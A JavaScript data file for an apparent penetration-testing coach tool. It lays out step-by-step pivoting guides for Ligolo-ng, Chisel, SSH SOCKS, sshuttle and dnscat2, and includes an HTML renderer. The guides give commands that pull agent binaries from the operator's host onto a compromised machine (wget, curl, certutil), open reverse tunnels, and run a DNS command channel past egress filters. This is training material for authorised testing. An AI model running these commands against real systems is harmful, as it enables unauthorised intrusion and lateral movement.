/*!
 * obol data — tunnels.js — OBOL.TUNNELS + OBOL.renderTunnelSteps
 *
 * The tunnel-setup catalog: the ways to pivot into a network you can only reach through a compromised
 * host, each with a thorough, hand-held, machine-by-machine setup guide. One shared source so the
 * connectivity panel's chooser (home.js) and the coach's staging guide (path.js) never drift — both
 * render through OBOL.renderTunnelSteps below. Ligolo-ng is the recommended default (a real routed
 * interface, no proxychains); the rest are offered for when it does not fit.
 *
 * These tools are the classic beginner wall: you have a shell on a dual-homed box, but the tool that
 * bridges you into the hidden subnet has to be STAGED on two machines at once — prepared on your Kali
 * box AND carried onto the compromised host you are pivoting through — before a single packet moves.
 * So every guide walks that explicitly: prepare on Kali, stage the agent onto the host, open the
 * tunnel, use it, clean up. Nothing is left as "transfer the binary first" in a footnote.
 *
 * Shape of each tool:
 *   { key, name, rec?, kind (socks|route|dns), moveId, summary, when, prereq?, steps:[...] }
 * Shape of each step:
 *   { phase, where, title, cmd?, alts?:[{label,cmd,note?}], why?, note?, check? }
 *     phase  groups the steps under a heading ("Prepare on Kali", "Stage the agent onto the host", ...)
 *     where  'local' (your Kali box) or 'host' (the compromised pivot) — drives the machine label
 *     cmd    the command, {{token}}s filled from the engagement params at render time; a value obol
 *            cannot know is written as a literal <placeholder> so it is obviously operator-supplied
 *     alts   OS/tool variants of one step (Linux vs Windows download) — shown all at once, nothing hidden
 *     why    plain-language what-this-does-and-why (the hand-holding)
 *     check  "you'll know it worked when ..." — a confidence checkpoint before moving on
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};

  OBOL.TUNNELS = [
    { key: 'ligolo', name: 'Ligolo-ng', rec: true, kind: 'route', moveId: 'pivot-ligolo',
      summary: 'A real routed interface into the subnet. No proxychains, every tool just works.',
      when: 'The best default: you get a normal network route into the hidden subnet, so nmap, impacket, evil-winrm and browsers all work unmodified.',
      prereq: 'A shell on the pivot host, the pivot\'s second subnet (read it from the host\'s own "ip a" / "ip route"), and the ability to run one binary on that host.',
      steps: [
        { phase: 'Prepare on Kali', where: 'local',
          title: 'Download the proxy (for Kali) and the agent (for the target)',
          cmd: 'xdg-open https://github.com/nicocha30/ligolo-ng/releases/latest',
          why: 'Ligolo-ng ships two separate binaries: the proxy runs here on your Kali box, the agent runs on the target. Pick the proxy for your Kali arch (linux_amd64) and the agent for the TARGET\'s OS (linux or windows). They must be the same version or the agent will refuse to connect.',
          note: 'Loadout can install the Kali proxy for you (Tunnel category). You still grab the agent that matches the target.',
          check: 'You have two files to work with: a proxy for Kali and an agent for the target.' },
        { phase: 'Prepare on Kali', where: 'local',
          title: 'Unpack the two binaries',
          cmd: 'tar -xzf ligolo-ng_proxy_*_linux_amd64.tar.gz proxy && tar -xzf ligolo-ng_agent_*_linux_amd64.tar.gz agent',
          why: 'The releases are gzipped tarballs. This leaves ./proxy (you run it here) and ./agent (you ship it to the target) in the current folder.',
          note: 'For a Windows target the agent asset ends in windows_amd64.zip; unzip it to get agent.exe instead.' },
        { phase: 'Prepare on Kali', where: 'local',
          title: 'Create the ligolo interface and start the proxy',
          cmd: 'sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up && sudo ./proxy -selfcert',
          why: 'The "ligolo" tun interface is where the hidden subnet\'s traffic will surface on your box; the proxy listens on 0.0.0.0:11601 for the agent to dial back. -selfcert generates a throwaway TLS cert for the lab.',
          note: 'Leave this window running. You now have a "ligolo-ng >>" console prompt that you drive the tunnel from.',
          check: 'You see the ligolo-ng banner and prompt, and "ip addr show ligolo" lists the interface.' },
        { phase: 'Stage the agent onto the host', where: 'local',
          title: 'Serve the agent from Kali',
          cmd: 'python3 -m http.server 8000',
          why: 'The target cannot magically get the agent; you host it on Kali and pull it from the foothold. Run this from the folder that holds ./agent (or agent.exe).',
          note: 'Any transfer works (an SMB share, scp, a C2 upload). A one-line HTTP server is the most universal, so it is the default here.',
          check: 'Visiting http://{{lhost}}:8000/ from your own browser lists the agent file.' },
        { phase: 'Stage the agent onto the host', where: 'host',
          title: 'Download the agent onto the foothold',
          why: 'Run this IN YOUR SHELL ON THE TARGET, not on Kali. Match the command to the target\'s OS. On Linux you must chmod +x before it will run; a good writable spot is /tmp or /dev/shm, and C:\\Windows\\Temp on Windows.',
          alts: [
            { label: 'Linux (wget)', cmd: 'wget http://{{lhost}}:8000/agent -O /tmp/agent && chmod +x /tmp/agent' },
            { label: 'Linux (curl)', cmd: 'curl http://{{lhost}}:8000/agent -o /tmp/agent && chmod +x /tmp/agent' },
            { label: 'Windows (PowerShell)', cmd: 'iwr http://{{lhost}}:8000/agent.exe -OutFile C:\\Windows\\Temp\\agent.exe' },
            { label: 'Windows (certutil)', cmd: 'certutil -urlcache -split -f http://{{lhost}}:8000/agent.exe C:\\Windows\\Temp\\agent.exe' },
          ],
          check: 'The agent file is on the target, and on Linux it is executable (ls -l shows the x bit).' },
        { phase: 'Open the tunnel', where: 'host',
          title: 'Connect the agent back to your proxy',
          why: 'The agent dials OUT to your proxy (a reverse connection), so it works even when the target\'s own ports are firewalled off from you. -ignore-cert accepts the self-signed cert from -selfcert.',
          alts: [
            { label: 'Linux', cmd: '/tmp/agent -connect {{lhost}}:11601 -ignore-cert' },
            { label: 'Windows', cmd: 'C:\\Windows\\Temp\\agent.exe -connect {{lhost}}:11601 -ignore-cert' },
          ],
          check: 'Your proxy console prints "Agent joined" with the target\'s name.' },
        { phase: 'Open the tunnel', where: 'local',
          title: 'Select the agent session in the proxy console',
          cmd: 'session',
          why: 'Type this at the "ligolo-ng >>" prompt and pick the agent that just joined. Every command after this acts on that session.',
          note: 'This is a ligolo-ng console command, not a shell command: type it in the proxy window.',
          check: 'The prompt updates to show the selected agent as the active session.' },
        { phase: 'Open the tunnel', where: 'local',
          title: 'Route the internal subnet through ligolo, then start',
          cmd: 'sudo ip route add <internal-cidr> dev ligolo',
          why: 'This tells Kali "to reach that subnet, send it through the ligolo interface." Read <internal-cidr> from the foothold\'s own "ip a" / "ip route" (the second network it sits on, e.g. 172.16.5.0/24).',
          note: 'Then bring the tunnel up: type "start" in the console. Newer ligolo-ng builds can also do the whole interface and route from the console with interface_create, interface_add_route and tunnel_start.',
          check: '"ip route get <internal-ip>" shows the path going "dev ligolo".' },
        { phase: 'Use it', where: 'local',
          title: 'Reach the internal network, no proxychains needed',
          cmd: 'nmap -sV -Pn <internal-ip>',
          why: 'Because ligolo gives you a real route, every tool runs unmodified: nmap SYN scans, impacket, evil-winrm, even a browser. This is the big win over a SOCKS proxy, where you would have to prefix everything with proxychains.',
          note: 'Enumerate the new subnet exactly like you did the first host.',
          check: 'You get results from an internal host you could not reach before the tunnel.' },
        { phase: 'Clean up', where: 'local',
          title: 'Tear the tunnel down when you are done',
          cmd: 'sudo ip route del <internal-cidr> dev ligolo',
          why: 'Remove the route and stop the proxy and agent so you leave the network as you found it, and note the teardown for your report.',
          note: 'Then Ctrl-C the proxy window and kill the agent process on the target.',
          check: 'The route is gone and traffic to the subnet no longer uses ligolo.' },
      ] },

    { key: 'chisel', name: 'Chisel (SOCKS)', kind: 'socks', moveId: 'pivot-chisel-socks',
      summary: 'A reverse SOCKS proxy; run your tools through proxychains.',
      when: 'Great when you cannot add a route (no root on Kali for a tun interface) but can run a binary on the host.',
      prereq: 'A shell on the pivot host and the ability to run the chisel binary on it. No root needed on Kali.',
      steps: [
        { phase: 'Prepare on Kali', where: 'local',
          title: 'Get chisel for Kali and for the target',
          cmd: 'xdg-open https://github.com/jpillora/chisel/releases/latest',
          why: 'Chisel is one binary that acts as server or client. Grab the Kali build (linux_amd64) for the server you run here, and the build matching the target\'s OS for the client you will ship.',
          check: 'You have a chisel for Kali and one for the target.' },
        { phase: 'Prepare on Kali', where: 'local',
          title: 'Start the chisel server on Kali',
          cmd: 'chisel server -p 8080 --reverse',
          why: 'The server waits for the client to dial back and, with --reverse, lets that client open a SOCKS proxy on your side. It exposes SOCKS5 on 127.0.0.1:1080.',
          note: 'Leave this running.',
          check: 'The server logs that it is listening on 0.0.0.0:8080.' },
        { phase: 'Stage the client onto the host', where: 'local',
          title: 'Serve the chisel client from Kali',
          cmd: 'python3 -m http.server 8000',
          why: 'Same staging pattern as any pivot: host the client binary on Kali so the foothold can pull it.',
          check: 'http://{{lhost}}:8000/ lists the chisel file.' },
        { phase: 'Stage the client onto the host', where: 'host',
          title: 'Download chisel onto the foothold',
          why: 'Run this in your shell on the target and match it to the OS. Linux needs chmod +x.',
          alts: [
            { label: 'Linux (wget)', cmd: 'wget http://{{lhost}}:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel' },
            { label: 'Windows (certutil)', cmd: 'certutil -urlcache -split -f http://{{lhost}}:8000/chisel.exe C:\\Windows\\Temp\\chisel.exe' },
          ],
          check: 'The chisel binary is on the target and runnable.' },
        { phase: 'Open the tunnel', where: 'host',
          title: 'Run the chisel client back to your server',
          why: 'R:socks forwards a reverse SOCKS5 tunnel from the target back through your server. The client dials out, so target-side inbound firewalling does not matter.',
          alts: [
            { label: 'Linux', cmd: '/tmp/chisel client {{lhost}}:8080 R:socks' },
            { label: 'Windows', cmd: 'C:\\Windows\\Temp\\chisel.exe client {{lhost}}:8080 R:socks' },
          ],
          check: 'The Kali server logs a new session and that the SOCKS proxy is up on 127.0.0.1:1080.' },
        { phase: 'Use it', where: 'local',
          title: 'Point proxychains at the SOCKS port',
          cmd: 'echo \'socks5 127.0.0.1 1080\' | sudo tee -a /etc/proxychains4.conf',
          why: 'proxychains reads this config to know where to send wrapped traffic. Add the line once; a duplicate line is harmless.',
          check: 'The last line of /etc/proxychains4.conf is "socks5 127.0.0.1 1080".' },
        { phase: 'Use it', where: 'local',
          title: 'Send your tools through the tunnel',
          cmd: 'proxychains -q nmap -sT -Pn <internal-ip>',
          why: 'Prefix TCP tools with proxychains to route them through the pivot. Use -sT: a SOCKS proxy cannot carry nmap\'s raw-packet SYN scan, and UDP/ICMP will not traverse it at all.',
          check: 'The wrapped tool returns results from the internal host.' },
        { phase: 'Clean up', where: 'local',
          title: 'Stop the tunnel and tidy the config',
          cmd: 'sudo sed -i \'/^socks5 127.0.0.1 1080$/d\' /etc/proxychains4.conf',
          why: 'Ctrl-C the client on the target and the server on Kali, then remove the SOCKS line so later engagements start clean.',
          note: 'Record the pivot in your report before you tear it down.' },
      ] },

    { key: 'ssh-dynamic', name: 'SSH dynamic (-D)', kind: 'socks', moveId: 'pivot-ssh-dynamic',
      summary: 'The quickest SOCKS when you already have SSH on the pivot. Nothing to upload.',
      when: 'Fastest path when you hold SSH credentials or a key on the pivot host.',
      prereq: 'Valid SSH credentials or a private key for an account on the pivot. Nothing is staged on the host, which is exactly why this is the quickest option.',
      steps: [
        { phase: 'Open the tunnel', where: 'local',
          title: 'Open a dynamic SOCKS port over SSH',
          cmd: 'ssh -D 1080 -N {{user}}@{{target}}',
          why: 'OpenSSH itself becomes the proxy: -D 1080 opens a local SOCKS5 port that tunnels through the SSH session, and -N means "no shell, just the tunnel." Nothing is uploaded to the pivot.',
          note: 'Add -f to push it into the background once you trust it; drop -f the first time so you see any auth error.',
          check: '"ss -tlnp | grep 1080" on Kali shows ssh listening on 127.0.0.1:1080.' },
        { phase: 'Use it', where: 'local',
          title: 'Point proxychains at the SOCKS port',
          cmd: 'echo \'socks5 127.0.0.1 1080\' | sudo tee -a /etc/proxychains4.conf',
          why: 'Tell proxychains where the SOCKS proxy is. Add the line once.',
          check: 'The last line of /etc/proxychains4.conf is "socks5 127.0.0.1 1080".' },
        { phase: 'Use it', where: 'local',
          title: 'Send your tools through the tunnel',
          cmd: 'proxychains -q nmap -sT -Pn <internal-ip>',
          why: 'Prefix TCP tools with proxychains. Use -sT because SYN scans and UDP do not survive a SOCKS hop.',
          check: 'You reach an internal host that was invisible before.' },
        { phase: 'Clean up', where: 'local',
          title: 'Close the tunnel',
          cmd: 'sudo sed -i \'/^socks5 127.0.0.1 1080$/d\' /etc/proxychains4.conf',
          why: 'Ctrl-C the ssh session (or kill the backgrounded one) and remove the SOCKS line.' },
      ] },

    { key: 'sshuttle', name: 'sshuttle', kind: 'route', moveId: 'pivot-sshuttle',
      summary: 'Transparent subnet routing over SSH, with nothing to run on the host.',
      when: 'Clean when you have SSH on the pivot and Python is present there; behaves like a route, no proxychains.',
      prereq: 'SSH credentials or a key on the pivot, and Python present on the pivot (sshuttle ships its own code over the session). Nothing is staged by hand.',
      steps: [
        { phase: 'Open the tunnel', where: 'local',
          title: 'Route the subnet over SSH from your box',
          cmd: 'sshuttle -r {{user}}@{{target}} <internal-cidr>',
          why: 'sshuttle runs entirely from Kali over the SSH session and transparently forwards all traffic to <internal-cidr> through the pivot, like a route, so no proxychains and no SYN-scan limitation. It uploads its own Python helper automatically, so there is nothing for you to stage.',
          note: 'Read <internal-cidr> from the pivot\'s own "ip a" / "ip route". Add --dns to also tunnel name resolution.',
          check: 'sshuttle prints "Connected to server." and stays in the foreground.' },
        { phase: 'Use it', where: 'local',
          title: 'Reach the internal network directly',
          cmd: 'nmap -sV -Pn <internal-ip>',
          why: 'Because the subnet is now routed, tools run unmodified, exactly like with ligolo.',
          check: 'An internal host responds that you could not reach before.' },
        { phase: 'Clean up', where: 'local',
          title: 'Stop routing',
          cmd: 'Ctrl-C the sshuttle window',
          why: 'Ending sshuttle removes the transparent route. Note the pivot in your report first.' },
      ] },

    { key: 'dns', name: 'DNS tunnel (dnscat2)', kind: 'dns', moveId: 'dns-tunnel',
      summary: 'A channel over DNS for when only DNS resolves outbound.',
      when: 'Last resort for an egress-filtered host where nothing but DNS leaves the network.',
      prereq: 'A domain whose authoritative NS you control and have delegated to your Kali box, and the ability to run the dnscat2 client on the foothold.',
      steps: [
        { phase: 'Prepare on Kali', where: 'local',
          title: 'Start the dnscat2 server on your box',
          cmd: 'dnscat2-server {{domain}}',
          why: 'Your box becomes authoritative for the delegated domain and waits for tunneled sessions. All client traffic arrives disguised as DNS lookups for that domain.',
          note: 'This only works if {{domain}}\'s NS records already point at your box.',
          check: 'The server prints its pre-shared secret and "Starting Dnscat2 DNS server".' },
        { phase: 'Stage the client onto the host', where: 'local',
          title: 'Serve the dnscat2 client from Kali',
          cmd: 'python3 -m http.server 8000',
          why: 'Host the client binary so the foothold can pull it, the same staging pattern as the other tools.',
          check: 'http://{{lhost}}:8000/ lists the client.' },
        { phase: 'Stage the client onto the host', where: 'host',
          title: 'Download the client onto the foothold',
          why: 'Run this on the target and match it to the OS; Linux needs chmod +x.',
          alts: [
            { label: 'Linux (wget)', cmd: 'wget http://{{lhost}}:8000/dnscat -O /tmp/dnscat && chmod +x /tmp/dnscat' },
            { label: 'Windows (certutil)', cmd: 'certutil -urlcache -split -f http://{{lhost}}:8000/dnscat.exe C:\\Windows\\Temp\\dnscat.exe' },
          ],
          check: 'The client is on the target and runnable.' },
        { phase: 'Open the tunnel', where: 'host',
          title: 'Run the dnscat2 client out over DNS',
          why: 'The client tunnels a command channel out through DNS queries for {{domain}}, the one protocol still allowed to leave an egress-filtered network.',
          alts: [
            { label: 'Linux', cmd: '/tmp/dnscat {{domain}}' },
            { label: 'Windows', cmd: 'C:\\Windows\\Temp\\dnscat.exe {{domain}}' },
          ],
          check: 'Your dnscat2 server prints "New window created" with a new session number.' },
        { phase: 'Use it', where: 'local',
          title: 'Forward a port through the DNS session',
          cmd: 'listen 127.0.0.1:1080 <internal-ip>:445',
          why: 'In the dnscat2 server console, interact with the session ("window -i 1") and forward a local port to the internal service you need. DNS tunnels are slow, so forward one service rather than scanning the whole subnet.',
          note: 'Then point your tool at 127.0.0.1:1080. Expect high latency; this is a last resort, not a comfortable pivot.',
          check: 'Connecting to 127.0.0.1:1080 on Kali reaches the internal service.' },
        { phase: 'Clean up', where: 'local',
          title: 'Close the session',
          cmd: 'kill the dnscat2 session, then Ctrl-C the server',
          why: 'Tear down the tunnel and stop the client on the target when you are done.' },
      ] },
  ];

  // Shared renderer so the coach's Setup guide (path.js) and the hub's tunnel chooser (home.js) render
  // identical, in-sync steps. Returns the <ol class="stage-steps"> for one tool, with phase-group
  // headers, the per-step why/check hand-holding, and OS variants listed in full (nothing hidden).
  // Tick state lives under the same obol.stage:<moveId>:<flatIndex> key both routes already toggle.
  OBOL.renderTunnelSteps = function (tool, params) {
    var U = OBOL.util || {};
    var esc = U.esc || function (s) { return String(s == null ? '' : s); };
    var attr = U.attr || esc;
    params = params || {};
    function fill(cmd) {
      return String(cmd == null ? '' : cmd).replace(/\{\{(\w+)\}\}/g, function (m, k) {
        var v = params[k];
        if ((v === undefined || v === '') && k === 'user') v = params.username;
        return (v !== undefined && v !== '') ? v : '<' + k + '>';
      });
    }
    function stageDone(id, i) { try { return localStorage.getItem('obol.stage:' + id + ':' + i) === '1'; } catch (e) { return false; } }
    function cmdRow(cmd) {
      var c = fill(cmd);
      return '<div class="stage-cmd"><code>' + esc(c) + '</code>'
        + '<button class="btn-copy stage-copy" data-copy="' + attr(c) + '" title="Copy command">copy</button></div>';
    }
    var steps = (tool && tool.steps) || [], lastPhase = null, html = '';
    for (var i = 0; i < steps.length; i++) {
      var st = steps[i];
      if (st.phase && st.phase !== lastPhase) {
        lastPhase = st.phase;
        html += '<li class="stage-phase" role="presentation"><span class="stage-phase-l">' + esc(st.phase) + '</span></li>';
      }
      var done = stageDone(tool.moveId, i);
      var whereLbl = st.where === 'host' ? 'On the target host' : 'On your Kali box';
      var cmds = '';
      if (st.alts && st.alts.length) {
        cmds = '<div class="stage-alts">' + st.alts.map(function (a) {
          return '<div class="stage-alt"><span class="stage-alt-l">' + esc(a.label) + '</span>' + cmdRow(a.cmd)
            + (a.note ? '<div class="stage-note">' + esc(a.note) + '</div>' : '') + '</div>';
        }).join('') + '</div>';
      } else if (st.cmd) {
        cmds = cmdRow(st.cmd);
      }
      html += '<li class="stage-step stage-' + (st.where || 'local') + (done ? ' done' : '') + '">'
        + '<button type="button" class="stage-check" data-stage="' + attr(tool.moveId) + '" data-stage-i="' + i + '" role="checkbox" aria-checked="' + (done ? 'true' : 'false') + '" aria-label="Mark step ' + (i + 1) + ' done">' + (done ? '\u2713' : '') + '</button>'
        + '<div class="stage-body"><div class="stage-wl"><span class="stage-n">' + (i + 1) + '</span>'
        + '<span class="stage-where stage-where-' + (st.where || 'local') + '">' + esc(whereLbl) + '</span>'
        + '<span class="stage-title">' + esc(st.title) + '</span></div>'
        + (st.why ? '<div class="stage-why">' + esc(st.why) + '</div>' : '')
        + cmds
        + (st.note ? '<div class="stage-note">' + esc(st.note) + '</div>' : '')
        + (st.check ? '<div class="stage-verify"><span class="stage-verify-l">You\'ll know it worked:</span> ' + esc(st.check) + '</div>' : '')
        + '</div></li>';
    }
    return '<ol class="stage-steps">' + html + '</ol>';
  };
})(typeof globalThis !== 'undefined' ? globalThis : this);
